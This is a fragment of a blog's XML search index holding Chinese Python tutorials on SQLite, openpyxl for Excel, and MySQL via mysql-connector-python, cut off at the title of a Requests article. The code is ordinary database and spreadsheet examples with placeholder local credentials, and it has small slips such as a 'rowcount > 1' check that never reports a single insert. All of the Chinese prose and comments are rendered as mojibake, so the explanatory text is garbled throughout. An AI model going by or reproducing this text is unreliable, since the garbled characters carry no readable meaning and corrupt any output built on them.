    <content type="text"><![CDATA[SQLiteçš„æ•°æ®åº“å°±æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”Pythonå†…ç½®äº†SQLite3ï¼Œæ‰€ä»¥ä¸éœ€è¦å®‰è£…ä»»ä½•ä¸œè¥¿å°±å¯ä»¥ç›´æŽ¥ä½¿ç”¨ã€‚åœ¨æ—¥å¸¸çš„è„šæœ¬ç¨‹åºä¸­ä¸ä¸€å®šä¼šç”¨åˆ°åƒMySQLè¿™æ ·çš„æ•°æ®åº“ï¼Œç»å¸¸ä¼šé‡åˆ°ä¸€ä¸ªç®€å•çš„åŠŸèƒ½ä½†æ˜¯åˆéœ€è¦å…³ç³»åž‹æ•°æ®åº“çš„ä¸€äº›åŠŸèƒ½ï¼ŒSQLiteè¶³å¤Ÿå°å·§ï¼Œè€Œä¸”æ˜¯ä»¥æ–‡ä»¶çš„å½¢å¼è¿›è¡Œå­˜æ”¾ï¼Œæ–¹ä¾¿è„šæœ¬å’Œæ–‡ä»¶åŒæ—¶è·¨å¹³å°æ‹·è´åŽèƒ½å¤Ÿä¿ç•™ä¸Šä¸€ä¸ªå¹³å°çš„æ•°æ®ã€‚ SQLiteçš„ä½¿ç”¨æ–¹å¼åŒMySQLç±»ä¼¼ï¼Œéƒ½æ˜¯éœ€è¦å¾—åˆ°ä¸€ä¸ªè¿žæŽ¥å¯¹è±¡Connectionï¼Œç„¶åŽé€šè¿‡Connectionå¯¹è±¡å–åˆ°Cursoræ“ä½œæ¸¸æ ‡åŽå°±å¯ä»¥ç”¨æ¸¸æ ‡çš„executeæ–¹æ³•æ“ä½œæ•°æ®åº“äº†ã€‚å’ŒMySQLä¸€æ ·ï¼Œåœ¨å¯¹æ•°æ®åº“è¿›è¡Œå¢žåˆ æ”¹çš„æ—¶å€™éœ€è¦æäº¤äº‹åŠ¡ï¼Œå¦‚æžœæ“ä½œæˆåŠŸé€šè¿‡cursor.rowcountä¼šè¿”å›žæ“ä½œæˆåŠŸçš„æ¡æ•°ã€‚ å¿«é€Ÿå¼€å§‹ç”±äºŽSQLiteæ¯”MySQLçš„æ“ä½œæ›´åŠ ç®€å•ï¼ŒåŸºæœ¬éƒ½æ˜¯SQLæ“ä½œï¼Œè¿™é‡Œå°±ä¸éœ€è¦å…·ä½“åˆ†æžäº†ã€‚ç›´æŽ¥è´´ä»£ç ï¼Œéœ€è¦æ—¶å¯å›žè¿™é‡Œçœ‹ä¸€çœ¼ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import sqlite3# è¿žæŽ¥åˆ°æ•°æ®åº“ï¼Œå¦‚æžœæ–‡ä»¶ä¸å­˜åœ¨ä¼šè‡ªåŠ¨åœ¨å½“å‰ç›®å½•åˆ›å»ºconn = sqlite3.connect('sample.db')# èŽ·å–åˆ°æ“ä½œæ¸¸æ ‡cursor = conn.cursor()# é€šè¿‡æ“ä½œæ¸¸æ ‡æ‰§è¡ŒSQLè¯­å¥try: cursor.execute('create table score_table(id int (20) primary key , name varchar(255), score int(3))')except sqlite3.Error as err: print(err)# æ’å…¥æ•°æ®users = [ (1, "è“å£«é’¦", 96), (2, "æŽå°é¾™", 100), (3, "é˜¿é‡Œ", 98), (4, "å°æŽ", 80), (5, "çŽ‹å¤§é”¤", 60),]for user in users: try: cursor.execute("insert into score_table(`id`,`name`,`score`) values (?,?,?)", user) if cursor.rowcount &gt; 1: print("æ’å…¥æˆåŠŸ!") except sqlite3.Error as err: print(err)# åˆ é™¤æ•°æ®delete_param = ("è“å£«é’¦", 80)cursor.execute("delete from score_table where `name` = ? or score = ?", delete_param)# ä¿®æ”¹æ•°æ®cursor.execute("update score_table set `name` = ? where `name` = ?", ("å°æŽ", "å¤§æŽ"))# æŸ¥è¯¢æ•°æ® æŸ¥è¯¢åˆ†æ•°åœ¨ 50 åˆ° 98 ä¹‹é—´çš„äººçš„åå­—, åˆ†æ•°ä»Žä½Žåˆ°é«˜è¿›è¡ŒæŽ’åºcursor.execute("select `name` from score_table where score between ? and ? order by score asc ", (50, 98))# è¾“å‡ºæŸ¥è¯¢ç»“æžœprint(cursor.fetchall())# å…³é—­æ“ä½œæ¸¸æ ‡cursor.close()# æäº¤è¿žæŽ¥äº‹åŠ¡conn.commit()# å…³é—­è¿žæŽ¥conn.close() SQLiteå±žäºŽåµŒå…¥å¼æ•°æ®åº“ï¼Œéžå¸¸å°å·§ï¼Œåœ¨å„ç§ä¾¿æ·å¼ç§»åŠ¨è®¾å¤‡ä¸Šæœ‰ç€å¤§é‡çš„åº”ç”¨ã€‚è™½ç„¶SQLiteä¹Ÿå±žäºŽå…³ç³»åž‹æ•°æ®åº“ï¼Œä½†æ˜¯ä¸ºäº†ä¾¿æ·å°å·§æ‰€ä»¥ä¸€äº›å…³ç³»åž‹åŠŸèƒ½ä¸å¦‚ä¸“ä¸šçš„å…³ç³»åž‹æ•°æ®åº“ï¼Œæ¯”å¦‚ä¸æ”¯æŒä¸»é”®è‡ªå¢žç­‰ã€‚å…·ä½“å·®å¼‚å’Œæ›´å¤šSQLiteçŸ¥è¯†å¯æŸ¥é˜…SQLiteå®˜ç½‘ï¼šhttps://www.sqlite.org/index.html]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨Pythonæé«˜å·¥ä½œæ•ˆçŽ‡ä¹‹Excel]]></title>
    <url>%2F983f7127%2F</url>
    <content type="text"><![CDATA[Excelæœ¬èº«æä¾›äº†éžå¸¸å¼ºå¤§çš„åŠŸèƒ½ï¼Œåœ¨æ•°æ®ç»Ÿè®¡å’Œåˆ†æžæ—¶ç»å¸¸ä¼šå¯¼å‡ºåˆ°CSVæˆ–è€…Excelç­‰æ–‡ä»¶ï¼Œä¹Ÿå¸¸å¸¸ä¼šä»ŽExcelè¯»å–æ•°æ®è¿›è¡Œè®¡ç®—ã€‚æ—¥å¸¸çš„è‡ªåŠ¨åŒ–è„šæœ¬è¯»å†™æ•°æ®æ—¶æˆ‘ä½¿ç”¨æ¯”è¾ƒå¤šçš„ä¹Ÿæ˜¯Excelã€‚å¯¹Excelçš„æ“ä½œæœ‰å„ç§ä¸åŒçš„ç¬¬ä¸‰æ–¹åº“ï¼Œæ•ˆçŽ‡ä»¥åŠå¹³å°æ”¯æŒéƒ½å„æœ‰åƒç§‹ã€‚æ ¹æ®ç»¼åˆæƒ…å†µï¼Œæˆ‘é€‰æ‹©äº†æ”¯æŒæœ€å¤šå¹³å°ï¼Œå¹¶ä¸”è¯­æ³•æœ€ç®€å•æ˜“ç”¨çš„openpyxlè¿™ä¸ªåº“ï¼Œåœ¨æ­¤åšä¸ªç®€å•çš„ä½¿ç”¨ç¤ºä¾‹è®°å½•ï¼Œæ ¹æ®æ¯æ¬¡ä½¿ç”¨é‡åˆ°çš„é—®é¢˜ä»¥åŠè§£å†³æ–¹æ³•éƒ½ä¼šå¢žé‡ä¿®æ”¹æ–‡ç« ï¼Œç§¯ç´¯å¹¶æ€»ç»“é—®é¢˜èƒ½å¤Ÿæ–¹ä¾¿æ—¥åŽé‡åˆ°ç›¸åŒçš„é—®é¢˜æ—¶èƒ½å¤Ÿå¿«é€ŸæŸ¥é˜…å¹¶è§£å†³ã€‚ åŸºç¡€éƒ¨åˆ†openpyxlæ”¯æŒçš„Pythonç‰ˆæœ¬pythonç‰ˆæœ¬å¿…é¡»å¤§äºŽ2.7ï¼Œå¹¶ä¸”ä¸èƒ½æ˜¯3.0.xåˆ°3.3.xçš„ç‰ˆæœ¬ã€‚openpyxlåº“ä¸æ”¯æŒ.xlsåŽç¼€çš„æ–‡ä»¶åªæ”¯æŒ.xlsxåŽç¼€çš„Excelæ–‡ä»¶,ä¸è¿‡åªè¦æ˜¯Office 2007 åŠåŽç»­çš„ç‰ˆæœ¬éƒ½æ”¯æŒ.xlsxåŽç¼€çš„æ–‡ä»¶å®‰è£…openpyxl:1pip install openpyxl openpyxlä¸­APIå¯¹åº”çš„Excelæ¦‚å¿µ Workbook å·¥ä½œç°¿ï¼Œå¯¹åº”ä¸€ä¸ª.xlsæˆ–.xlsxåŽç¼€çš„æ–‡ä»¶ Worksheet å·¥ä½œè¡¨ï¼Œä¸€ä¸ªExcelå·¥ä½œç°¿ä¸­ï¼ŒåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªå·¥ä½œè¡¨ï¼Œé€šå¸¸åœ¨Excelçš„é¡¶éƒ¨æˆ–è€…åº•éƒ¨æ ‡ç­¾æ ä¸­å¯ä»¥çœ‹åˆ°ã€‚ é¦–å…ˆç”¨Workbookæž„é€ æˆ–è€…æ‰“å¼€ä¸€ä¸ªExcelæ–‡ä»¶å¾—åˆ°å·¥ä½œç°¿ï¼Œç„¶åŽé€šè¿‡å·¥ä½œç°¿å¯¹è±¡èŽ·å–Worksheetå·¥ä½œè¡¨ã€‚é€šè¿‡å¾—åˆ°çš„å·¥ä½œè¡¨å¯¹è±¡ï¼Œå°±å¯ä»¥å¯¹è¯¥å·¥ä½œè¡¨çš„è¡Œå’Œåˆ—è¿›è¡Œè¯»å†™æ“ä½œäº†ã€‚ å¿«é€Ÿä½¿ç”¨å†™å…¥Excel1234567891011121314151617181920212223import datetimefrom openpyxl import Workbook# åˆ›å»ºå·¥ä½œç°¿wb = Workbook()# èŽ·å–æ¿€æ´»çš„å·¥ä½œè¡¨ï¼ˆé»˜è®¤ä¸ºç¬¬ä¸€ä¸ªï¼‰ws = wb.active# å°†å½“å‰å·¥ä½œè¡¨çš„A1å•å…ƒæ ¼èµ‹å€¼ä¸º42ws['A1'] = 42# ä»Žæœ‰æ•°æ®å•å…ƒæ ¼çš„ä¸‹ä¸€è¡Œå¼€å§‹ï¼Œä»Žæœ€å·¦å¾€å³å•å…ƒæ ¼åˆ†åˆ«èµ‹å€¼ä¸º 1 2 3ws.append([1, 2, 3])# å°†å½“å‰å·¥ä½œè¡¨çš„A2å•å…ƒæ ¼èµ‹å€¼ä¸ºå½“å‰æ—¶é—´ws['A2'] = datetime.datetime.now()# ä»Žæœ‰æ•°æ®å•å…ƒæ ¼çš„ä¸‹ä¸€è¡Œå¼€å§‹ï¼Œä»Žæœ€å·¦å¾€å³å•å…ƒæ ¼åˆ†åˆ«èµ‹å€¼ä¸º 1 2 3ws.append([1, 2, 3, 4])# å°†æ–‡ä»¶å†…å®¹ä¿å­˜åˆ°å½“å‰ç›®å½•çš„ sample.xlsx æ–‡ä»¶ä¸­wb.save("sample.xlsx") ä¸Šè¿°ä»£ç ä¸­ws[&#39;A2&#39;]å°†A2åŽŸæœ¬çš„å€¼1ä¿®æ”¹æˆäº†å½“å‰æ—¶é—´ã€‚ä¿å­˜åŽçš„Excelå·¥ä½œç°¿æ‰“å¼€å¦‚ä¸‹æ‰€ç¤º è¯»å–Excel12345678910from openpyxl import load_workbook# åŠ è½½å·¥ä½œç°¿wb = load_workbook(filename='sample.xlsx')# èŽ·å–æ¿€æ´»çš„å·¥ä½œè¡¨ws = wb.active# æ‰“å°å·¥ä½œè¡¨A1å•å…ƒæ ¼çš„å€¼print(ws['A1'].value) å¤æ‚ä¸€ç‚¹çš„ç”¨æ³•å†™å…¥Excelæ–‡ä»¶1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from openpyxl import Workbookfrom openpyxl.styles import Fontfrom openpyxl.styles import colorsfrom openpyxl.styles import Alignment# åˆ›å»ºå·¥ä½œç°¿wb = Workbook()# èŽ·å–æ¿€æ´»çš„å·¥ä½œè¡¨ï¼ˆé»˜è®¤åç§°ä¸ºSheetï¼‰ws = wb.active# è®¾ç½®å·¥ä½œè¡¨åç§°ws.title = "99ä¹˜æ³•è¡¨"for x in range(1, 10): for y in range(1, 10): if x &gt;= y: ws.cell(x, y, str(y) + "*" + str(x) + "=" + str(x * y)) else: continue# åˆ›å»º "æ•™å¸ˆä¿¡æ¯" å·¥ä½œè¡¨ï¼Œå·¥ä½œè¡¨ä½ç½®ä¸ºé»˜è®¤å€¼ws_teacher = wb.create_sheet("æ•™å¸ˆä¿¡æ¯")# åˆ›å»º "å­¦ç”Ÿä¿¡æ¯" å·¥ä½œè¡¨,å¹¶è®¾ç½®å·¥ä½œè¡¨ä½ç½®ä¸ºç¬¬1ä¸ªws_student = wb.create_sheet("å­¦ç”Ÿä¿¡æ¯", 1)# è®¾ç½® "å­¦ç”Ÿä¿¡æ¯" å·¥ä½œè¡¨çš„æ ‡ç­¾é¢œè‰²ï¼Œè¯¥å€¼ä¸ºRGBå€¼ws_student.sheet_properties.tabColor = "1072BA"# å°†"å­¦ç”Ÿä¿¡æ¯" å·¥ä½œè¡¨çš„ç¬¬1è¡Œç¬¬1åˆ—èµ‹å€¼ä¸º"å§“å"ws_student.cell(row=1, column=1, value="å§“å")# å°†"å­¦ç”Ÿä¿¡æ¯" å·¥ä½œè¡¨çš„ç¬¬2è¡Œç¬¬1åˆ—èµ‹å€¼ä¸º"è“å£«é’¦"ws_student.cell(row=2, column=1, value="è“å£«é’¦")# åˆå¹¶A1åˆ°F1å•å…ƒæ ¼cell = ws_teacher.merge_cells('A1:F1')# è®¾ç½®å•å…ƒæ ¼å­—ä½“ä¸ºè“è‰²ï¼Œ15å·å¤§å°ï¼Œæ–œä½“ws_teacher['A1'].font = Font(color=colors.BLUE, size=15, italic=True)# è®¾ç½®ä¸ºåž‚ç›´å±…ä¸­å¯¹é½,æ°´å¹³å±…ä¸­å¯¹é½ws_teacher['A1'].alignment = Alignment(vertical='center', horizontal='center')# ä¸ºå•å…ƒæ ¼èµ‹å€¼ws_teacher['A1'] = "æ•™å¸ˆä¿¡æ¯æ ‡é¢˜"# å°†"æ•™å¸ˆä¿¡æ¯" å·¥ä½œè¡¨çš„ç¬¬6è¡Œç¬¬6åˆ—èµ‹å€¼ä¸º"æµ‹è¯•"ws_teacher.cell(row=6, column=6, value="æµ‹è¯•")# ä»Ž "å­¦ç”Ÿä¿¡æ¯" å·¥ä½œè¡¨æ‹·è´åˆ°æ–°å·¥ä½œè¡¨target = wb.copy_worksheet(ws_student)# è®¾ç½®å·¥ä½œè¡¨çš„åç§°target.title = "æ–°å·¥ä½œè¡¨"# å°†æ–‡ä»¶å†…å®¹ä¿å­˜åˆ°å½“å‰ç›®å½•çš„ sample2.xlsx æ–‡ä»¶ä¸­wb.save("sample2.xlsx") ä¿å­˜åŽçš„Excelå·¥ä½œç°¿æ‰“å¼€ï¼Œå¯¹åº”æœ‰å¤šä¸ªå·¥ä½œè¡¨ï¼Œæ¯ä¸ªå·¥ä½œè¡¨çš„å†…å®¹åˆ†åˆ«å¦‚ä¸‹æ‰€ç¤ºï¼š è¯»å–Excelæ–‡ä»¶1234567891011121314151617181920from openpyxl import load_workbook# åŠ è½½å·¥ä½œç°¿wb = load_workbook(filename='sample2.xlsx')# èŽ·å–æ‰€æœ‰å·¥ä½œè¡¨wss = wb.worksheets# éåŽ†å·¥ä½œè¡¨for ws in wss: # æ‰“å°æŒ‡å®šå·¥ä½œè¡¨çš„æ‰€æœ‰å•å…ƒæ ¼çš„å€¼ if ws.title == "99ä¹˜æ³•è¡¨": for row in ws.rows: for index in row: if index.value is None: continue else: print(index.value + '\t', end='') print('') continue æœ‰å…³openpyxlæ“ä½œExcelå•å…ƒæ ¼çš„æ ·å¼å’Œæ›´è¯¦ç»†çš„ç”¨æ³•ï¼Œå‚è€ƒå…¶ä»–ä½œè€…çš„æ–‡ç« ï¼šhttps://www.jianshu.com/p/7af9a7c5b27d openpyxlå®˜æ–¹æ–‡æ¡£åœ°å€ï¼šhttps://openpyxl.readthedocs.io/en/stable/]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨Pythonæé«˜å·¥ä½œæ•ˆçŽ‡ä¹‹MySQL]]></title>
    <url>%2Fb4dc6b2c%2F</url>
    <content type="text"><![CDATA[æ—¥å¸¸å¼€å‘æµ‹è¯•ä¸­ç»å¸¸éœ€è¦åœ¨æ•°æ®åº“ä¸­é€ ä¸€äº›æµ‹è¯•æ•°æ®ï¼Œä¸ºäº†èƒ½å¤Ÿå¿«é€Ÿå®Œæˆä»»åŠ¡ï¼Œé€šå¸¸æˆ‘éƒ½å–œæ¬¢ç”¨Pythonæ¥å†™ã€‚ç›®å‰ä½¿ç”¨æ¯”è¾ƒå¤šçš„æ˜¯MySQLæ•°æ®åº“ï¼ŒPythonæœ‰å¯¹åº”çš„å¾ˆå¤šç¬¬ä¸‰æ–¹åº“å¯ä»¥ç”¨ï¼Œä½†æˆ‘è¿˜æ˜¯åšæŒä½¿ç”¨MySQLå®˜æ–¹æä¾›çš„æ”¯æŒåº“mysql-connector-pythonï¼Œå› ä¸ºè¿™ä¸ªåº“æä¾›äº†MySQLçš„æ‰€æœ‰æ“ä½œAPIï¼Œè€Œä¸”æœ¬èº«è¯­æ³•å·²ç»è¶³å¤Ÿç®€å•ï¼Œå¯¹äºŽå†™æ—¥å¸¸è„šæœ¬æ¥è¯´å·²ç»è¶³å¤Ÿã€‚ å‡†å¤‡å·¥ä½œ Python3.xçŽ¯å¢ƒ MySQL 8.0æ•°æ®åº“ MySQLå®˜æ–¹æä¾›çš„Pythoné©±åŠ¨ ä¸åŒçš„æ“ä½œç³»ç»Ÿå¯é€‰çš„å®‰è£…æ–¹å¼éƒ½å·®ä¸å¤šï¼Œå…·ä½“å†…å®¹å¯ä»¥å‚ç…§MySQLå®˜æ–¹æ–‡æ¡£https://dev.mysql.com/doc/connector-python/en/connector-python-installation-binary.html ä¸è¿‡ä¹Ÿä¸ä¸€å®šéžè¦æŠŠé©±åŠ¨å®‰è£…åˆ°ç³»ç»Ÿä¸Šï¼Œæ¯”å¦‚ä¸‹è½½é©±åŠ¨åº“å°±å¯ä»¥ç›´æŽ¥ç”¨PythonåŽ»æ“ä½œäº†ï¼Œå¯ä»¥ç›´æŽ¥åœ¨å½“å‰çš„Pythonå·¥ç¨‹EnvçŽ¯å¢ƒä¸‹å®‰è£…1pip install mysql-connector-python å¿«é€Ÿä½¿ç”¨è¿žæŽ¥åˆ°æ•°æ®åº“1.å¼•å…¥é©±åŠ¨åº“1import mysql.connector 2.æ‰“å¼€/å…³é—­è¿žæŽ¥12345cnx = mysql.connector.connect(user='root', password='123456', host='127.0.0.1', port='3306', database='py_example')cnx.close() mysql.connector.connect()æ–¹æ³•æä¾›äº†å¾ˆå¤šå‚æ•°ï¼Œæœ‰äº›å‚æ•°æ˜¯å¯é€‰çš„ï¼Œæ¯”å¦‚ç«¯å£å·å¦‚æžœä¸ä¼ é»˜è®¤å°±æ˜¯33063.å¼‚å¸¸çš„æ•èŽ·12345678910import mysql.connectortry: cnx = mysql.connector.connect(user='root', password='123456', host='127.0.0.1', port='3307', database='py_example') cnx.close()except mysql.connector.Error as err: print(err) æ‰€è¿žæŽ¥çš„MySQLç«¯å£å·ä¸º3306ï¼Œåœ¨ä»£ç ä¸­æ•…æ„å°†ç«¯å£å·è®¾ç½®ä¸º3307,ä½¿å…¶æ— æ³•æ­£å¸¸è¿žæŽ¥åˆ°æ•°æ®åº“ï¼ŒæŠ›å‡ºå¼‚å¸¸åŽå°†è¢«æ•èŽ·å¹¶æ‰“å°ï¼š12003 (HY000): Can&apos;t connect to MySQL server on &apos;127.0.0.1&apos; (61) å¦‚æžœè¦æ ¹æ®ä¸åŒçš„é”™è¯¯ç è¿›è¡Œè‡ªå®šä¹‰è¾“å‡ºï¼Œå¯ä»¥åœ¨å¤´éƒ¨å¼•å…¥from mysql.connector import errorcode,é€šè¿‡å¯¹æ¯”æ•èŽ·çš„err.errnoå’Œerrorcodeçš„å„ç§é¢„å®šä¹‰é”™è¯¯å€¼è¿›è¡Œæ¯”å¯¹,æ›´å¤šè¿žæŽ¥æ–¹å¼å’Œè¯¦ç»†çš„å¼‚å¸¸æ•èŽ·è¾“å‡ºï¼Œå¯ä»¥å‚ç…§å®˜æ–¹æ–‡æ¡£ï¼šhttps://dev.mysql.com/doc/connector-python/en/connector-python-example-connecting.html çµæ´»çš„è¿žæŽ¥å‚æ•°1234567891011121314151617import mysql.connectorconfig = &#123; "user": "root", "password": "123456", "host": "127.0.0.1", "database": "py_example"&#125;def connect(conf): try: cnx = mysql.connector.connect(**conf) except mysql.connector.Error as err: print(err) else: return cnx mysql.connector.connect()æ–¹æ³•æ”¯æŒä¼ å…¥ä¸€ä¸ªjsonå¯¹è±¡ï¼Œè¿™æ ·å°±å¯ä»¥å¾ˆæ–¹ä¾¿çš„æŠŠæ•°æ®åº“è¿žæŽ¥å®šä¹‰åˆ°å¤–éƒ¨æˆ–è€…å¤–éƒ¨æ–‡ä»¶ã€‚è¿žæŽ¥æ•°æ®åº“æ˜¯ä¸ºäº†å¾—åˆ°è¿žæŽ¥å¯¹è±¡ï¼Œæ‰€ä»¥å®šä¹‰ä¸€ä¸ªconnect()æ–¹æ³•ï¼Œä¼ å…¥å‚æ•°ä¸ºæ•°æ®åº“é…ç½®ï¼Œè¯¥æ–¹æ³•è¿”å›žä¸€ä¸ªæ•°æ®åº“è¿žæŽ¥å¯¹è±¡cnxã€‚ æ•°æ®åº“çš„åŸºæœ¬æ“ä½œé€šè¿‡mysql.connector.connect()è¿”å›žä¸€ä¸ªconnectè¿žæŽ¥å¯¹è±¡ï¼Œé€šè¿‡è¯¥è¿žæŽ¥å¯¹è±¡çš„cursor()æ–¹æ³•å¯ä»¥å¾—åˆ°æ“ä½œæ•°æ®åº“çš„æ¸¸æ ‡ã€‚123if __name__ == '__main__': conn = connect(config) cursor = conn.cursor() é€šè¿‡cursor.execute()æ–¹æ³•å°±å¯ä»¥æ‰§è¡ŒSQLè¯­å¥äº†ã€‚ åˆ›å»ºæ•°æ®åº“1cursor.execute("CREATE DATABASE &#123;&#125; DEFAULT CHARACTER SET 'utf8mb4'".format('db_name')) åˆ›å»ºè¡¨12345678910table_sql = """CREATE TABLE `table_name` ( `t_id` INT(11) NOT NULL AUTO_INCREMENT, `name` VARCHAR(255) NOT NULL , `gender` ENUM('M','F') NOT NULL , `birth_date` DATE NOT NULL, PRIMARY KEY (`t_id`)) ENGINE = INNODB"""cursor.execute(table_sql) æ’å…¥æ•°æ®123456insert_sql = """INSERT INTO `table_name` (`name`,`gender`,`birth_date`) VALUES ('è“å£«é’¦','M','1995-01-29')"""cursor.execute(insert_sql)# conné»˜è®¤ä¸ä¼šè‡ªåŠ¨æäº¤äº‹åŠ¡ï¼Œæ‰€ä»¥è¿™é‡Œä¸€å®šè¦æ‰‹åŠ¨æäº¤äº‹åŠ¡ï¼Œå¦åˆ™è®°å½•ä¸ä¼šæ’å…¥åˆ°MySQLä¸­conn.commit() é™¤äº†ä½¿ç”¨SQLæ‹¼æŽ¥æ–¹å¼ï¼Œè¿˜å¯ä»¥ä½¿ç”¨æ¨¡å—ç¬¦ä»£æ›¿ï¼Œç„¶åŽé€šè¿‡ä¼ å…¥ä¸€ä¸ªPythonå…ƒç»„çš„æ–¹å¼1234567insert_sql_template = """INSERT INTO `table_name` (`name`,`gender`,`birth_date`) VALUES (%s,%s,%s)"""insert_sql_date = ('è“å£«é’¦', 'M', date(1995, 1, 29))cursor.execute(insert_sql_template,insert_sql_date)# æäº¤äº‹åŠ¡conn.commit() é™¤äº†ä½¿ç”¨å…ƒç»„ï¼Œè¿˜å¯ä»¥ä½¿ç”¨Jsonæ ¼å¼çš„å¯¹è±¡ä½œä¸ºå˜é‡å¡«å……å‚æ•°12345678910111213sql = """INSERT INTO `table_name` (`name`,`gender`,`birth_date`) VALUES (%(name)s,%(gender)s,%(birth_date)s)"""data = &#123; "name": "æµ‹è¯•å§“å", "gender": "M", "birth_date": date(1995, 1, 29),&#125;cursor.execute(sql,data)# æäº¤äº‹åŠ¡conn.commit() å¯ä»¥çœ‹åˆ°ä»£ç ä¸­æ¯æ¬¡ä½¿ç”¨cursor.execute()æ–¹æ³•æ‰§è¡Œsqlè¯­å¥ä¹‹åŽï¼Œéƒ½éœ€è¦æŽ‰ç”¨è¿žæŽ¥å¯¹è±¡conn.commit()æ–¹æ³•ï¼Œconné»˜è®¤ä¸ä¼šè‡ªåŠ¨æäº¤äº‹åŠ¡ï¼Œæ‰€ä»¥è¿™é‡Œä¸€å®šè¦æ‰‹åŠ¨æäº¤äº‹åŠ¡ï¼Œå¦åˆ™è®°å½•ä¸ä¼šæ’å…¥åˆ°MySQLä¸­ã€‚ä¸è¿‡ä¹Ÿå¯ä»¥æ ¹æ®å®žé™…ä½¿ç”¨åœºæ™¯ï¼Œè®¾ç½®æ¯æ¬¡executeéƒ½è‡ªåŠ¨æäº¤äº‹åŠ¡ï¼Œåªéœ€è¦èŽ·å–åˆ°è¿žæŽ¥å¯¹è±¡åŽè®¾ç½®1conn.autocommit = True ä¿®æ”¹æ•°æ®123456modify_sql = """UPDATE `table_name` SET `name`='æŽå°é¾™',`birth_date`='1940-11-27' WHERE `gender`='M'"""cursor.execute(modify_sql)# æäº¤äº‹åŠ¡conn.commit() æŸ¥è¯¢æ•°æ®12345678query_sql = """SELECT `t_id`,`name`,`gender`,`birth_date` FROM `table_name` WHERE `birth_date` BETWEEN %s and %s"""start_date = date(1990, 1, 1)end_date = date(2000, 1, 1)cursor.execute(query_sql, (start_date, end_date))for (t_id, name, gender, birth_date) in cursor: print("&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;".format(t_id, name, gender, birth_date)) åˆ é™¤æ•°æ®12345678910delete_sql = """DELETE FROM `table_name` WHERE `name` = %(name)s"""delete_action = &#123; "name": "å§“å"&#125;# æ‰§è¡Œsqlcursor.execute(delete_sql, delete_action)# æäº¤äº‹åŠ¡conn.commit() å®Œæ•´å®žä¾‹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123import mysql.connectorfrom datetime import dateconfig = &#123; "user": "root", "password": "123456", "host": "127.0.0.1", "database": "py_example"&#125;def connect(conf): try: cnx = mysql.connector.connect(**conf) except mysql.connector.Error as err: print(err) else: return cnxdef create_database(db_cursor, db_name): try: db_cursor.execute("CREATE DATABASE &#123;&#125; DEFAULT CHARACTER SET 'utf8mb4'".format(db_name)) except mysql.connector.Error as err: print(err.msg)def create_tables(db_cursor, sql_str): try: db_cursor.execute(sql_str) except mysql.connector.Error as err: print(err.msg)def execute(db_cursor, sql_str, data_obj=None): try: db_cursor.execute(sql_str, data_obj) except mysql.connector.Error as err: print(err.msg)if __name__ == '__main__': # èŽ·å–è¿žæŽ¥å¯¹è±¡ conn = connect(config) # è®¾ç½®è‡ªåŠ¨æäº¤äº‹åŠ¡ conn.autocommit = True # èŽ·å–æ“ä½œæ¸¸æ ‡ cursor = conn.cursor() # åˆ›å»ºæ•°æ®åº“ create_database(cursor, "db_example") # åˆ›å»ºè¡¨ table_sql = """ CREATE TABLE `table_example` ( `t_id` INT(11) NOT NULL AUTO_INCREMENT, `name` VARCHAR(255) NOT NULL , `gender` ENUM('M','F') NOT NULL , `birth_date` DATE NOT NULL, PRIMARY KEY (`t_id`) ) ENGINE = INNODB """ create_tables(cursor, table_sql) # æ’å…¥æ•°æ® insertSQL = """ INSERT INTO `table_example` (`name`,`gender`,`birth_date`) VALUES ('è“å£«é’¦','M','1995-01-29') """ execute(cursor, insertSQL) # æ’å…¥æ•°æ® insert_sql_template = """ INSERT INTO `table_example` (`name`,`gender`,`birth_date`) VALUES (%s,%s,%s) """ insert_sql_date = ('æµ‹è¯•å§“å', 'M', date(1996, 8, 30)) execute(cursor, insert_sql_template, insert_sql_date) # æ’å…¥æ•°æ® sql = """ INSERT INTO `table_example` (`name`,`gender`,`birth_date`) VALUES (%(name)s,%(gender)s,%(birth_date)s) """ data = &#123; "name": "è‡ªç”±å¥³ç¥ž", "gender": "F", "birth_date": date(1874, 1, 1), &#125; execute(cursor, sql, data) # ä¿®æ”¹æ•°æ® modify_sql = """ UPDATE `table_example` SET `name`='æŽå°é¾™',`birth_date`='1940-11-27' WHERE `gender`='M' """ execute(cursor, modify_sql) # æŸ¥è¯¢æ•°æ® query_sql = """ SELECT `t_id`,`name`,`gender`,`birth_date` FROM `table_example` WHERE `birth_date` BETWEEN %s and %s """ start_date = date(1900, 1, 1) end_date = date(2000, 1, 1) try: execute(cursor, query_sql, (start_date, end_date)) for (t_id, name, gender, birth_date) in cursor: print("&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;".format(t_id, name, gender, birth_date)) except mysql.connector.Error as err_obj: print(err_obj.msg) # åˆ é™¤æ•°æ® delete_sql = """ DELETE FROM `table_example` WHERE `name` = %(name)s """ delete_param = &#123; "name": "æŽå°é¾™" &#125; execute(cursor, delete_sql, delete_param) # å…³é—­æ“ä½œæ¸¸æ ‡ cursor.close() # å…³é—­æ•°æ®åº“è¿žæŽ¥ conn.close()]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨Pythonæé«˜å·¥ä½œæ•ˆçŽ‡ä¹‹Requestsåº“]]></title>
    <url>%2Fdb2a9d2b%2F</url>
